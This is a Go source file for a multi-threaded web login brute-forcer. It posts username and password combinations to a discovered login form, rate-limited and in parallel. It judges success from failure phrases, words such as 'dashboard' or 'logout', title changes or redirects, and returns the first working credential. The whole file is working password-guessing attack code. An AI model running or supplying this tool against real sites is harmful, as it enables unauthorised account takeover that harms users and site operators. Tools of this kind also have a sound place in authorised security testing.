package main

import (
	"context"
	"fmt"
	"io"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/PuerkitoBio/goquery"
	"github.com/fatih/color"
	"golang.org/x/time/rate"
)

type BruteForcer struct {
	scanner    *Scanner
	form       *Form
	threads    int
	limiter    *rate.Limiter
	foundCred  *Credential
	mu         sync.Mutex
	stopSignal chan struct{}
}

type Credential struct {
	Username  string
	Password  string
	Timestamp time.Time
}

type TestJob struct {
	Username string
	Password string
}

func NewBruteForcer(scanner *Scanner, form *Form, threads int, rateLimit int) *BruteForcer {
	return &BruteForcer{
		scanner:    scanner,
		form:       form,
		threads:    threads,
		limiter:    rate.NewLimiter(rate.Limit(rateLimit), rateLimit),
		stopSignal: make(chan struct{}),
	}
}

func (bf *BruteForcer) Start(usernames, passwords []string) *Credential {
	// Create job channel
	jobs := make(chan TestJob, bf.threads*2)
	results := make(chan *Credential, 1)
	var wg sync.WaitGroup

	// Start worker goroutines
	for i := 0; i < bf.threads; i++ {
		wg.Add(1)
		go bf.worker(i, jobs, results, &wg)
	}

	// Start result collector
	go func() {
		for cred := range results {
			if cred != nil {
				bf.mu.Lock()
				if bf.foundCred == nil {
					bf.foundCred = cred
					close(bf.stopSignal) // Signal all workers to stop
				}
				bf.mu.Unlock()
			}
		}
	}()

	// Feed jobs
	totalJobs := 0
	for _, username := range usernames {
		select {
		case <-bf.stopSignal:
			break
		default:
			for _, password := range passwords {
				select {
				case <-bf.stopSignal:
					break
				case jobs <- TestJob{Username: username, Password: password}:
					totalJobs++
				}
			}
		}
	}
	close(jobs)

	// Wait for all workers to finish
	wg.Wait()
	close(results)

	return bf.foundCred
}

func (bf *BruteForcer) worker(id int, jobs <-chan TestJob, results chan<- *Credential, wg *sync.WaitGroup) {
	defer wg.Done()

	currentUser := ""
	tested := 0

	for job := range jobs {
		select {
		case <-bf.stopSignal:
			return
		default:
		}

		// Rate limiting
		bf.limiter.Wait(context.Background())

		// Track progress per user
		if job.Username != currentUser {
			if currentUser != "" {
				fmt.Println() // New line after finishing a user
			}
			currentUser = job.Username
			tested = 0
			color.Cyan("\n[Worker %d] Testing username: %s", id, job.Username)
		}
		tested++

		// Test credential
		if bf.testCredential(job.Username, job.Password) {
			results <- &Credential{
				Username:  job.Username,
				Password:  job.Password,
				Timestamp: time.Now(),
			}
			return
		}

		// Progress indicator
		if tested%10 == 0 {
			fmt.Printf("\r[Worker %d] Tested: %d credentials for %s", id, tested, currentUser)
		}
	}
}

func (bf *BruteForcer) testCredential(username, password string) bool {
	// Prepare form data
	formData := url.Values{}

	// Add all form fields
	for field, value := range bf.form.Fields {
		formData.Set(field, value)
	}

	// Set username and password
	if bf.form.UsernameField != "" {
		formData.Set(bf.form.UsernameField, username)
	}
	if bf.form.PasswordField != "" {
		formData.Set(bf.form.PasswordField, password)
	}

	// Submit the form
	resp, err := bf.scanner.PostForm(bf.form.Action, formData)
	if err != nil {
		if bf.scanner.verbose {
			color.Yellow("[!] Request failed for %s:%s - %v", username, password, err)
		}
		return false
	}
	defer resp.Body.Close()

	// Read response
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return false
	}

	bodyStr := string(body)
	bodyLower := strings.ToLower(bodyStr)

	// Check for common failure indicators
	failureIndicators := []string{
		"invalid username or password",
		"invalid credentials",
		"login failed",
		"incorrect username",
		"incorrect password",
		"authentication failed",
		"wrong username",
		"wrong password",
		"bad credentials",
	}

	for _, indicator := range failureIndicators {
		if strings.Contains(bodyLower, indicator) {
			return false
		}
	}

	// Check for success indicators
	successIndicators := []string{
		"logout",
		"sign out",
		"welcome",
		"dashboard",
		"profile",
		"account",
		"my account",
	}

	for _, indicator := range successIndicators {
		if strings.Contains(bodyLower, indicator) {
			return true
		}
	}

	// Check if page title changed
	if bf.detectPageChange(bodyStr) {
		return true
	}

	// Check for redirect to different page
	if resp.Request.URL.String() != bf.form.Action {
		return true
	}

	return false
}

func (bf *BruteForcer) detectPageChange(responseBody string) bool {
	// Parse original page title
	originalDoc, err := goquery.NewDocumentFromReader(strings.NewReader(bf.scanner.GetOriginalPage()))
	if err != nil {
		return false
	}

	originalTitle := strings.TrimSpace(originalDoc.Find("title").Text())

	// Parse response page title
	responseDoc, err := goquery.NewDocumentFromReader(strings.NewReader(responseBody))
	if err != nil {
		return false
	}

	responseTitle := strings.TrimSpace(responseDoc.Find("title").Text())

	// If titles are different, likely logged in
	if originalTitle != "" && responseTitle != "" && originalTitle != responseTitle {
		return true
	}

	return false
}
